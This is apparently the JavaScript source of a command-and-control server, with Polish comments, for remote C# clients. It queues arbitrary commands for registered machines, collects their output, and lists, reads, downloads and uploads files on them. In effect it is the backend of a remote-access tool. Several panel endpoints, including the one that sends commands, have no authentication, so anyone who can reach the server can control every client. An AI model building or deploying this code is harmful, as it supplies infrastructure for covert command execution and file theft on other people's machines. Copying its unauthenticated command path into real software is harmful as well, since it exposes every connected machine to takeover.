import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';
import path from 'path';
import { fileURLToPath } from 'url';

// Setup __dirname i dotenv (tylko lokalnie)
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
if (process.env.NODE_ENV !== 'production') dotenv.config();

const app = express();
const port = process.env.PORT || 3000;

const API_TOKEN = process.env.API_TOKEN;
const PANEL_PASSWORD = process.env.PANEL_PASSWORD;

if (!API_TOKEN || !PANEL_PASSWORD) {
  console.error("❌ Brak wymaganych zmiennych środowiskowych (API_TOKEN lub PANEL_PASSWORD).");
  process.exit(1);
}

const clients = new Set();
const commands = {};
const results = {};

// Nowa struktura na listę plików od klienta:
// { [clientName]: { currentPath: string, files: [{name, type}] } }
const fileTrees = {};

// Struktura na zawartość plików
const fileContents = {};

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Middleware autoryzujący tylko dla klienta (C#)
function authMiddleware(req, res, next) {
  const token = req.headers['authorization'];
  if (token !== `Bearer ${API_TOKEN}`) {
    return res.status(403).send('Forbidden – nieprawidłowy token');
  }
  next();
}

// ------------------------ PANEL ----------------------------

// Logowanie panelu (sprawdzanie hasła)
app.post('/login', (req, res) => {
  const { password } = req.body;
  if (password === PANEL_PASSWORD) {
    res.json({ success: true });
  } else {
    res.status(403).json({ success: false });
  }
});

// Pobierz listę klientów - bez tokena
app.get('/clients', (req, res) => {
  res.json(Array.from(clients));
});

// Pobierz wynik klienta
app.get('/result', (req, res) => {
  const client = req.query.client;
  if (!client) return res.status(400).send('Brakuje klienta');
  const r = results[client];
  if (r) {
    delete results[client];
    return res.send(r);
  }
  res.status(204).send();
});

// --------------------- KLIENT C# --------------------------

// Klient zgłasza się i dodaje do listy
app.post('/register', authMiddleware, (req, res) => {
  const { client } = req.body;
  if (!client) return res.status(400).send('Brakuje klienta');
  clients.add(client);
  res.sendStatus(200);
});

// Klient pobiera komendę
app.get('/command', authMiddleware, (req, res) => {
  const client = req.query.client;
  if (!client) return res.status(400).send('Brakuje klienta');
  const cmd = commands[client];
  if (cmd) {
    delete commands[client];
    return res.send(cmd);
  }
  res.status(204).send();
});

// Klient wysyła wynik
app.post('/result', authMiddleware, (req, res) => {
  const { client, result } = req.body;
  if (!client || !result) return res.status(400).send('Brakuje danych');
  results[client] = result;
  res.sendStatus(200);
});

// Panel wysyła komendę do klienta
app.post('/command', (req, res) => {
  const { client, command } = req.body;
  if (!client || !command) return res.status(400).send('Brakuje danych');
  if (!clients.has(client)) return res.status(404).send('Klient nieznany');
  commands[client] = command;
  res.sendStatus(200);
});

// ------------------- Eksplorator plików (od klienta) --------------------

// Klient wysyła listę plików i folderów (dla podanej ścieżki)
app.post('/files', authMiddleware, (req, res) => {
  const { client, path, files } = req.body;
  if (!client || !path || !files) return res.status(400).send('Brakuje danych');

  // Zapisujemy dane
  fileTrees[client] = { currentPath: path, files };

  res.sendStatus(200);
});

// Klient wysyła zawartość pliku
app.post('/file', authMiddleware, (req, res) => {
  const { client, path, content } = req.body;
  if (!client || !path || content === undefined) return res.status(400).send('Brakuje danych');

  // Zapisujemy zawartość pliku
  if (!fileContents[client]) {
    fileContents[client] = {};
  }
  fileContents[client][path] = content;

  res.sendStatus(200);
});

// Panel pobiera listę plików i folderów dla klienta
app.get('/files', (req, res) => {
  const client = req.query.client;
  if (!client) return res.status(400).send('Brakuje klienta');

  const data = fileTrees[client];
  if (!data) return res.status(404).send('Brak danych o plikach');

  res.json(data);
});

// ------------------- API dla panelu (eksplorator plików) --------------------

// Panel żąda listy plików - wysyła komendę do klienta
app.get('/api/files', authMiddleware, (req, res) => {
  const path = req.query.path;
  const client = req.query.client;
  
  if (!path || !client) return res.status(400).send('Brakuje parametrów');
  if (!clients.has(client)) return res.status(404).send('Klient nieznany');

  // Wyślij komendę do klienta
  commands[client] = `listdir ${path}`;
  
  // Czekaj na odpowiedź (w praktyce panel powinien pollować)
  const checkForData = async () => {
    for (let i = 0; i < 30; i++) { // maksymalnie 15 sekund oczekiwania
      await new Promise(resolve => setTimeout(resolve, 500));
      const data = fileTrees[client];
      if (data && data.currentPath === path) {
        return res.json(data);
      }
    }
    res.status(408).send('Timeout - brak odpowiedzi od klienta');
  };

  checkForData();
});

// Panel żąda zawartości pliku - wysyła komendę do klienta
app.get('/api/file', authMiddleware, (req, res) => {
  const path = req.query.path;
  const client = req.query.client;
  
  if (!path || !client) return res.status(400).send('Brakuje parametrów');
  if (!clients.has(client)) return res.status(404).send('Klient nieznany');

  // Wyślij komendę do klienta
  commands[client] = `readfile ${path}`;
  
  // Czekaj na odpowiedź
  const checkForData = async () => {
    for (let i = 0; i < 30; i++) { // maksymalnie 15 sekund oczekiwania
      await new Promise(resolve => setTimeout(resolve, 500));
      if (fileContents[client] && fileContents[client][path] !== undefined) {
        const content = fileContents[client][path];
        // Usuń po pobraniu, aby nie zaśmiecać pamięci
        delete fileContents[client][path];
        return res.json({ content });
      }
    }
    res.status(408).send('Timeout - brak odpowiedzi od klienta');
  };

  checkForData();
});

// Panel pobiera plik (download) - base64 encoded
app.get('/api/download', authMiddleware, (req, res) => {
  const path = req.query.path;
  const client = req.query.client;
  
  if (!path || !client) return res.status(400).send('Brakuje parametrów');
  if (!clients.has(client)) return res.status(404).send('Klient nieznany');

  // Wyślij komendę do klienta
  commands[client] = `downloadfile ${path}`;
  
  // Czekaj na odpowiedź
  const checkForData = async () => {
    for (let i = 0; i < 60; i++) { // maksymalnie 30 sekund dla dużych plików
      await new Promise(resolve => setTimeout(resolve, 500));
      if (fileContents[client] && fileContents[client][path] !== undefined) {
        const base64Content = fileContents[client][path];
        // Usuń po pobraniu
        delete fileContents[client][path];
        
        try {
          // Konwertuj base64 na buffer
          const buffer = Buffer.from(base64Content, 'base64');
          const filename = path.split(/[\\/]/).pop();
          
          res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
          res.setHeader('Content-Type', 'application/octet-stream');
          return res.send(buffer);
        } catch (e) {
          return res.status(500).send('Błąd dekodowania pliku');
        }
      }
    }
    res.status(408).send('Timeout - brak odpowiedzi od klienta');
  };

  checkForData();
});

// Panel wysyła plik (upload)
app.post('/api/upload', authMiddleware, (req, res) => {
  const { client, path, content, filename } = req.body;
  
  if (!client || !path || !content || !filename) {
    return res.status(400).send('Brakuje parametrów');
  }
  if (!clients.has(client)) return res.status(404).send('Klient nieznany');

  // Wyślij komendę do klienta z zawartością pliku (base64)
  const fullPath = path.endsWith('\\') ? path + filename : path + '\\' + filename;
  commands[client] = `uploadfile ${fullPath} ${content}`;
  
  // Czekaj na potwierdzenie
  const checkForResult = async () => {
    for (let i = 0; i < 60; i++) { // maksymalnie 30 sekund
      await new Promise(resolve => setTimeout(resolve, 500));
      const result = results[client];
      if (result !== undefined) {
        delete results[client];
        if (result.includes('SUCCESS')) {
          return res.json({ success: true, message: 'Plik został przesłany' });
        } else {
          return res.status(400).json({ success: false, message: result });
        }
      }
    }
    res.status(408).send('Timeout - brak odpowiedzi od klienta');
  };

  checkForResult();
});

app.listen(port, () => {
  console.log(`✅ Serwer działa na porcie ${port}`);
});
